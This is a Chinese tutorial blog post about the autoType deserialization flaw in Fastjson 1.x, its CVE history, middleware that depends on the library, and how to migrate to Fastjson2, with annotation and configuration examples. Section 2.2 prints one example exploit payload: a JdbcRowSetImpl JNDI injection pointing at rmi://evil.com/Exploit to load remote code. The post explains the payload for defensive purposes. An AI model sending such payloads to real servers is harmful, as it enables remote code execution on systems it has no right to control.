---
title: "Fastjson 进化史：从 1.x 漏洞到 Fastjson2"
date: 2022-11-26T08:00:00+00:00
tags: ["基础技术"]
categories: ["序列化"]
author: "yaomingye"
showToc: true
TocOpen: true
draft: false
hidemeta: false
comments: false
description: "Fastjson 1.x 为什么快又为什么危险——autoType 机制与 CVE 漏洞链条、哪些中间件还在依赖它、Fastjson2 的安全性重构与 API 兼容方案、@JSONField 等注解全操作——附带完整的 Fastjson 1 → Fastjson2 迁移指南。"
disableShare: true
hideSummary: false
searchHidden: false
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: ""
    caption: ""
    relative: false
    hidden: true
---

# Fastjson 进化史：从 1.x 漏洞到 Fastjson2

> 📖 <strong>前置阅读</strong>：本文假设读者已理解序列化的基本概念和 JSON 序列化工具的用法。如果还不熟悉，建议先阅读 [<strong>序列化本质与 Jackson 全操作指南</strong>]({{< relref "JacksonGuide.md" >}})。

## 一、⚡ Fastjson 曾经有多火

Fastjson 是阿里巴巴 2011 年开源的 JSON 序列化库。在 Jackson 还比较沉重、Gson 性能一般的年代，Fastjson 凭三个特点迅速占领了国内 Java 项目：

| 卖点 | 具体表现 |
|------|------|
| <strong>快</strong> | 号称"Java 语言最快的 JSON 处理库"——字节码生成 + ASM 动态优化，比 Jackson 快 2x |
| <strong>API 简洁</strong> | `JSON.toJSONString(obj)` 一行搞定——比 Jackson 的 ObjectMapper 样板代码少 |
| <strong>阿里出品</strong> | 阿里巴巴开源——国内 Java 圈号召力最强背书 |

最火的那些年，<strong>几乎所有国内 Java 项目引入 Fastjson</strong>——Dubbo、RocketMQ、Nacos 内部都依赖了它。

## 二、💣 autoType：从"核心卖点"到"最大漏洞"

### 2.1 autoType 是什么

Fastjson 有一个 Jackson 没有的独特功能——<strong>autoType</strong>。它的作用是：JSON 中有一个 `@type` 字段，Fastjson 根据它自动反序列化为对应的 Java 类。

```java
// Fastjson 的 autoType 机制
// 序列化时——自动写入类的全限定名
String json = JSON.toJSONString(order);
// 结果：{"@type":"com.example.Order","orderId":10001,"amount":6999.00}
//          ↑ ↑ ↑ ↑ ↑ ↑ ↑ ↑ ↑ ↑ ↑ ↑
//          @type 字段记录了类的全限定名

// 反序列化时——根据 @type 字段自动还原为正确的子类型
// JSON 数据："{\"@type\":\"com.example.Order\",\"orderId\":10001}"
// 即使你只声明为 Object，Fastjson 也能还原出 Order 对象
Object obj = JSON.parse(json);  // 实际返回 Order 实例
```

这个功能在 Jackson 中需要 `@JsonTypeInfo` 注解手动声明——Fastjson <strong>默认自动开启</strong>。

### 2.2 autoType 为什么是漏洞

`@type` 字段指定了一个类的全限定名——Fastjson 通过反射实例化它。<strong>问题是：如果攻击者在 JSON 中指定了一个危险的类——Fastjson 也会实例化它</strong>。

```
正常请求：
  {"@type":"com.example.Order","orderId":10001}
  → Fastjson 实例化 Order 类 → 一切正常

攻击者请求：
  {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://evil.com/Exploit","autoCommit":true}
  → Fastjson 实例化 JdbcRowSetImpl → 触发 JNDI 注入 → 加载远程恶意代码 → 服务器被控！
```

整个攻击链：
```
攻击者发恶意 JSON  →  Fastjson 解析 @type  →  反射实例化危险类
  →  触发类的构造器/setter  →  JNDI 注入  →  远程加载恶意 class  →  执行任意代码
```

### 2.3 漏洞时间线

从 2017 年到 2022 年，Fastjson 1.x 的 CVE 列表——每一个都一样（autoType），只是绕过了之前的安全修复：

| CVE | 时间 | 攻击方式 | 修复方式 |
|------|------|------|------|
| CVE-2017-18349 | 2017 年 | JNDI 注入——最早的漏洞 | 加黑名单——拦截 JdbcRowSetImpl |
| CVE-2019-10173 | 2019 年 | 绕过黑名单——新的危险类 | 黑名单加更多类 |
| CVE-2020-8840 | 2020 年 | 又一次绕过 | 黑名单继续加——永远加不完 |
| CVE-2020-25845 | 2020 年 | 绕了 4 次 | Java 类上千个——黑名单跟不上 |
| CVE-2021-29505 | 2021 年 | 绕了 5 次 | 开启 SafeMode——关掉 autoType |
| CVE-2022-25845 | 2022 年 | 绕了 6 次 | — |

<strong>根本问题</strong>：autoType 的设计本身就不安全——根据外部输入的字符串实例化任意 Java 类是反模式。加黑名单只是堵，不是修。<strong>白名单或关掉 autoType 才是正确解法</strong>。

### 2.4 Fastjson 1.x 的正确使用姿势

```java
// ❌ 默认模式——autoType 开启，危险！
JSON.parse(jsonStr);

// ✅ 关闭 autoType（SafeMode）
ParserConfig.getGlobalInstance().setSafeMode(true);
JSON.parse(jsonStr);  // 安全了——但不支持 @type 解析

// ✅ 白名单模式——只允许指定的类
ParserConfig.getGlobalInstance().addAccept("com.example.Order");
ParserConfig.getGlobalInstance().addAccept("com.example.User");
JSON.parse(jsonStr);  // 只有白名单中的类可以走 autoType
```

> ⚠️ 新手提示：如果你的 Fastjson 版本 < 1.2.80，<strong>必须在启动时设置 SafeMode 或升级到 Fastjson2</strong>。即使你配了 SafeMode——老版本的 SafeMode 本身也可能被绕过（CVE-2022-25845 就是 SafeMode 绕过）。<strong>最安全的方案是升级到 Fastjson2</strong>。

## 三、🏭 哪些中间件还在用 Fastjson

即使你的项目用的是 Jackson，<strong>你引入的中间件可能内部依赖了 Fastjson</strong>——因为阿里生态的组件默认用 Fastjson：

| 中间件 / 框架 | Fastjson 依赖情况 | 现状 |
|------|------|------|
| <strong>Apache Dubbo 2.x</strong> | 内部序列化默认使用 Fastjson | Dubbo 3.x 默认切到 Hessian2 / Fastjson2 |
| <strong>Apache RocketMQ</strong> | 消息体序列化默认 Fastjson | 5.x 支持切换序列化器 |
| <strong>Nacos</strong> | 配置管理内部用 Fastjson | 2.x 逐步替换 |
| <strong>Sentinel</strong> | 规则解析用 Fastjson | 1.8+ 可选 Jackson |
| <strong>Seata</strong> | 分布式事务内部序列化用 Fastjson | 1.5+ 可选 |
| <strong>Druid</strong> | SQL 解析和统计结果序列化 | 仍在用 Fastjson 1.x |
| <strong>DataX</strong> | 数据同步配置解析 | 仍在用 |
| <strong>Canal</strong> | MySQL Binlog 解析工具 | 1.1.6+ 迁移到 Fastjson2 |

<strong>为什么这些中间件不切 Jackson？</strong> 因为历史惯性——早期 Dubbo/RocketMQ/Nacos 全部基于 Fastjson，API 和序列化格式紧耦合。切 Jackson 意味着改底层代码 + 破坏向后兼容。Fastjson2 因为 API 完全兼容 Fastjson 1.x，成了这些中间件升级的首选。

```xml
<!-- 你的项目依赖中检查 Fastjson 是否存在 -->
<!-- 运行 mvn dependency:tree | grep fastjson -->
<!-- 可能在你看不到的地方被间接依赖了 -->
```

## 四、🧬 Fastjson2：重构，不是修修补补

### 4.1 Fastjson2 做了什么

Fastjson2 不是 1.x 的补丁版本——它<strong>完全重写了内核</strong>：

```
Fastjson 1.x:
  ASM 字节码生成（快但复杂） + autoType 默认开启（不安全）
  → 黑名单堵漏洞 → 绕过 → 堵 → 绕 → ... → SafeMode（关了 autoType）

Fastjson2:
  全新解析器（仍用 ASM 但架构干净） + autoType 默认关闭
  → 需要 autoType 时——显式配置白名单
  → 不需要时——和 Jackson 一样安全
  → API 100% 兼容 Fastjson 1.x ——老代码不用改
```

| 维度 | Fastjson 1.x | Fastjson2 |
|------|:---:|:---:|
| <strong>核心解析器</strong> | ASM 字节码生成（古老设计） | 全新的基于注解处理器（编译期生成） |
| <strong>autoType</strong> | 默认开启（最大的问题） | <strong>默认关闭</strong>（需要时白名单） |
| <strong>性能</strong> | 快 | <strong>更快</strong>——号称比 1.x 快 2-3x |
| <strong>JDK 支持</strong> | 最高 JDK 8（兼容问题多） | JDK 8 ~ 21 |
| <strong>Jackson 兼容</strong> | ✗ | ✓——支持 Jackson 的注解 |
| <strong>API 兼容</strong> | — | 100% 兼容 1.x 的 `JSON.` API |
| <strong>安全</strong> | CVE 列表一长串 | 从零设计——默认安全 |

### 4.2 核心 API（和 1.x 完全一样）

```xml
<dependency>
    <groupId>com.alibaba.fastjson2</groupId>
    <artifactId>fastjson2</artifactId>
    <version>2.0.53</version>  <!-- 本文写作时的最新版——以实际为准 -->
</dependency>
```

```java
// Fastjson2 的 API 和 Fastjson 1.x 一模一样——包名都不用改
import com.alibaba.fastjson2.JSON;  // 注意：是 fastjson2，不是 fastjson

// ===== 序列化：Java 对象 → JSON 字符串 =====
Order order = new Order(10001L, 2001L, "iPhone 15",
        new BigDecimal("6999.00"), "created", LocalDateTime.now());
String json = JSON.toJSONString(order);
System.out.println(json);
// 输出：{"orderId":10001,"userId":2001,"productName":"iPhone 15","amount":"6999.00","action":"created","createTime":"2024-01-15 10:30:00"}

// ===== 反序列化：JSON 字符串 → Java 对象 =====
String jsonStr = "{\"orderId\":10001,\"userId\":2001,\"productName\":\"iPhone 15\",\"amount\":\"6999.00\"}";

// 方式一：parseObject
Order parsedOrder = JSON.parseObject(jsonStr, Order.class);

// 方式二：链式调用
Order parsedOrder2 = JSON.parseObject(jsonStr)
        .toJavaObject(Order.class);

// 方式三：泛型反序列化（Fastjson2 有 TypeReference）
List<Order> orders = JSON.parseObject(jsonListStr,
    new TypeReference<List<Order>>() {});
```

### 4.3 Fastjson2 专有注解

```java
@JSONType(orders = {"userId", "orderId", "amount"})  // 指定序列化字段顺序
public class Order {

    @JSONField(name = "order_id")  // 等价于 Jackson 的 @JsonProperty("order_id")
    private Long orderId;

    @JSONField(name = "user_id", ordinal = 1)  // ordinal 控制顺序——越小越前
    private Long userId;

    @JSONField(serialize = false)  // 等价于 Jackson 的 @JsonIgnore
    private String internalNote;

    @JSONField(format = "yyyy-MM-dd HH:mm:ss")  // 日期格式
    private LocalDateTime createTime;

    @JSONField(serializeFeatures = JSONWriter.Feature.WriteBigDecimalAsPlain)
    private BigDecimal amount;  // BigDecimal 不用科学计数法
}

// 类级别注解
@JSONType(
    includes = {"orderId", "productName", "amount"},  // 只输出这几个字段
    orders = {"orderId", "productName", "amount"}       // 按此顺序输出
)
```

| Fastjson2 注解 | Jackson 等价 | 作用 |
|------|------|------|
| `@JSONField(name="xxx")` | `@JsonProperty("xxx")` | 改字段名 |
| `@JSONField(serialize=false)` | `@JsonIgnore` | 隐藏字段 |
| `@JSONField(format="yyyy-MM-dd")` | `@JsonFormat(pattern="yyyy-MM-dd")` | 日期格式 |
| `@JSONField(ordinal=1)` | `@JsonProperty(index=1)` | 输出顺序 |
| `@JSONType(includes={"a","b"})` | `@JsonInclude` 配合 | 只输出指定字段 |
| `@JSONType(orders={"a","b"})` | `@JsonPropertyOrder({"a","b"})` | 输出顺序 |
| `@JSONField(deserialize=false)` | `@JsonProperty(access=READ_ONLY)` | 只序列化不反序列化 |

### 4.4 Fastjson2 的 Jackson 兼容模式

```java
// Fastjson2 支持 Jackson 的注解——老项目如果已经在用 Jackson 注解
// 切到 Fastjson2 后不需要改注解！
public class Order {

    @JsonProperty("order_id")      // Jackson 的注解——
                                // Fastjson2 也认得它！
    private Long orderId;

    @JsonIgnore
    private String internalNote;

    @JsonFormat(pattern = "yyyy-MM-dd HH:mm:ss")
    private LocalDateTime createTime;

    // Fastjson2 序列化时会读取 @JsonProperty / @JsonIgnore / @JsonFormat
    // 行为和对 Jackson 一样——零修改代价迁移
}
```

### 4.5 全局配置

```java
// Fastjson2 的全局配置——通过静态方法
JSON.config(
    // 日期格式
    JSONWriter.Feature.WriteDateTimeUseDateFormat,
    // BigDecimal 不用科学计数法
    JSONWriter.Feature.WriteBigDecimalAsPlain,
    // null 字段不输出
    JSONWriter.Feature.SkipNullValues,
    // 美化输出（调试用）
    JSONWriter.Feature.PrettyFormat
);

// 或者 SpringBoot 中通过 Fastjson2 的 HttpMessageConverter 配
@Configuration
public class Fastjson2Config {

    @Bean
    public HttpMessageConverters fastjson2Converters() {
        Fastjson2HttpMessageConverter converter =
                new Fastjson2HttpMessageConverter();
        converter.setDefaultCharset(StandardCharsets.UTF_8);
        converter.setFeatures(
                JSONWriter.Feature.WriteBigDecimalAsPlain,
                JSONWriter.Feature.SkipNullValues,
                JSONWriter.Feature.WriteDateTimeUseDateFormat);
        return new HttpMessageConverters(converter);
    }
}
```

### 4.6 Fastjson2 使用白名单——需要 autoType 时

```java
// Fastjson2 默认关闭 autoType——需要时才开启
// 方式一：白名单——添加允许的类的 package
JSON.config(
    JSONReader.Feature.SupportAutoType,
    JSONReader.Feature.FieldBased
);

// 通过配置文件设置白名单——/META-INF/fastjson2/autoTypeFilter
// 每行一个：com.example.model.Order
//            com.example.model.User

// 或者代码中直接配
JSON.register(java.sql.Timestamp.class);
JSON.register(java.util.Date.class);
JSON.register(com.example.model.Order.class);
```

## 五、从 Fastjson 1.x 迁移到 Fastjson2

### 5.1 迁移三步走

<strong>第一步：换依赖</strong>

```xml
<!-- 删掉 -->
<dependency>
    <groupId>com.alibaba</groupId>
    <artifactId>fastjson</artifactId>
    <version>1.2.83</version>
</dependency>

<!-- 换成 -->
<dependency>
    <groupId>com.alibaba.fastjson2</groupId>
    <artifactId>fastjson2</artifactId>
    <version>2.0.53</version>
</dependency>
```

<strong>第二步：改 import（可选——Fastjson2 兼容 1.x 的包路径）</strong>

```java
// Fastjson 1.x 的 import
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.annotation.JSONField;

// Fastjson2 的 import——包名变了
import com.alibaba.fastjson2.JSON;
import com.alibaba.fastjson2.JSONObject;
import com.alibaba.fastjson2.annotation.JSONField;

// 注：Fastjson2 提供了 fastjson1-forward 兼容模块——用 1.x 的 import 直接调到 2.x 实现
// <dependency>
//     <groupId>com.alibaba.fastjson2</groupId>
//     <artifactId>fastjson2-extension</artifactId>
//     <version>2.0.53</version>
// </dependency>
// 引入后 import com.alibaba.fastjson.JSON 自动指向 fastjson2 的实现
```

<strong>第三步：全局配置补齐</strong>

```java
// Fastjson 1.x 中的全局配置 → Fastjson2 等价写法
// 1.x: JSON.DEFAULT_GENERATE_FEATURE |= SerializerFeature.SkipTransientField.getMask();
// 2.x: JSON.config(JSONWriter.Feature.SkipTransientFields);

// 1.x: 序列化 null 值
// 2.x: JSON.config(JSONWriter.Feature.WriteNulls);
```

### 5.2 注意事项

| 1.x 行为 | 2.x 行为 | 怎么兼容 |
|------|------|------|
| `JSON.toJSONString(obj)` 默认包含 null 字段 | 默认包含 null 字段——相同 | 不需要改动 |
| `JSON.parseObject(str)` 默认开启 autoType | <strong>默认关闭 autoType</strong> | 需要 autoType 时——配白名单 |
| `SerializerFeature.WriteDateUseDateFormat` | `JSONWriter.Feature.WriteDateTimeUseDateFormat` | 枚举名变了——查找替换 |
| `JSONField.format` | 完全相同 | 不需要改动 |
| `JSON.parseObject(str, Feature.SupportAutoType)` | 不存在 `Feature` 类——用 `JSONReader.Feature` | 改用 `JSON.config()` |

## 六、Fastjson2 的安全保障

```
Fastjson 1.x 的安全模型：
  autoType 默认开 → 攻击者找到一个绕过黑名单的类 → 又是一个 CVE
  → 本质是"默认不安全 + 堵漏"

Fastjson2 的安全模型：
  autoType 默认关 → 你要用 = 你显式声明白名单 → 不在白名单的类直接拒绝
  → 本质是"默认安全 + 白名单"
```

<strong>这个设计思路和 Java 的安全管理器是一样的</strong>——默认最小权限，需要什么开什么。Fastjson2 的 autoType 白名单是<strong>基于 Package 的</strong>——你声明 `com.example.model.*`，这个包下所有类都可以走 autoType——跨 Package 的攻击链直接失效。

## 🎯 总结

1. <strong>Fastjson 1.x 的 autoType 是设计缺陷</strong>：根据外部输入的字符串反射实例化任意类——这不是 bug 是反模式。CVE 从 2017 打到 2022，本质都是 autoType + JNDI 注入。黑名单永远追不上攻击者的新绕过。

2. <strong>阿里生态的中间件仍在用 Fastjson</strong>：Dubbo 2.x、RocketMQ、Nacos、Druid——你的项目即使自己不用 Fastjson，也可能被间接依赖。检查 `mvn dependency:tree | grep fastjson`。

3. <strong>Fastjson2 的内核完全重写</strong>：autoType 默认关闭 + 白名单模型——从"默认不安全"变成"默认安全"。API 100% 兼容 Fastjson 1.x——老代码 import 都不用改（用兼容包）。

4. <strong>迁移成本极低</strong>：换依赖 → 改 import（可选）→ 配白名单（如果需要 autoType）→ 完成。Fastjson2 甚至支持 Jackson 的注解——如果你已经在用 Jackson 注解，切到 Fastjson2 注解也不用改。

> 📖 <strong>下一步阅读</strong>：Jackson 和 Fastjson2 各有各的擅长。性能、API 设计、生态整合——到底选哪个？继续阅读 [<strong>Jackson vs Fastjson2 终极对比</strong>]({{< relref "SerializationComparison.md" >}})。
